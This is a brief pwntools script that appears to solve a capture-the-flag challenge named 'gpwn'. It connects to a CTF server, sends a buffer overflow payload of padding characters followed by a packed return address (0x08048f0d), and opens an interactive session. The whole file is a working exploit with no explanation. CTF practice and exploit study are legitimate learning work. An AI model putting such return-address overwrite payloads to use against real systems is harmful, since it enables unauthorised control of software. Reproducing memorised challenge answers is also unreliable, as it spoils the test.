from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3011)
#r = process('./gpwn')

payload = ''
payload += "I"*21
payload += "A"
payload += p32(0x08048f0d)

r.sendline(payload)
r.interactive()
